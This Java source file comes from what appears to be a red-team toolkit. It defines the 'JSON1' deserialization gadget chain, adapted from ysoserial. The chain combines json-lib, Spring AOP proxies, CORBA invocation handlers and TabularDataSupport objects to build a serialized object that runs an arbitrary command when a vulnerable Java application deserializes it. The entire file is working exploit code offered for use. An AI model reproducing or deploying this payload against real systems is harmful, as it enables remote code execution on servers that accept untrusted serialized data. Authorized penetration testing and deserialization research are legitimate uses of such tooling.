package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import net.sf.json.JSONObject;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.openmbean.CompositeData;
import javax.management.openmbean.CompositeType;
import javax.management.openmbean.OpenDataException;
import javax.management.openmbean.OpenType;
import javax.management.openmbean.TabularDataSupport;
import javax.management.openmbean.TabularType;
import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

/**
 * Trigger chain based on json-lib bean processing plus Spring AOP proxy dispatch.
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({
        "net.sf.json-lib:json-lib:jar:jdk15:2.4",
        "org.springframework:spring-aop:4.1.4.RELEASE",
        "aopalliance:aopalliance:1.0",
        "commons-logging:commons-logging:1.2",
        "commons-lang:commons-lang:2.6",
        "net.sf.ezmorph:ezmorph:1.0.6",
        "commons-beanutils:commons-beanutils:1.9.2",
        "org.springframework:spring-core:4.1.4.RELEASE",
        "commons-collections:commons-collections:3.1"
})
@Authors({Authors.MBECHLER})
public class JSON1 implements ObjectPayload<Object> {

    @Override
    public Map getObject(String command) throws Exception {
        return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
    }

    public static Map makeCallerChain(Object payload, Class... ifaces)
            throws OpenDataException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException {
        CompositeType rt = new CompositeType("a", "b", new String[]{
                "a"
        }, new String[]{
                "a"
        }, new OpenType[]{
                javax.management.openmbean.SimpleType.INTEGER
        });
        TabularType tt = new TabularType("a", "b", rt, new String[]{
                "a"
        });
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(payload);
        InvocationHandler delegateInvocationHandler =
                (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
        InvocationHandler cdsInvocationHandler =
                Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
        InvocationHandler invocationHandler =
                (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
        CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);

        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);
        return Gadgets.makeMap(t1, t2);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JSON1.class, args);
    }
}
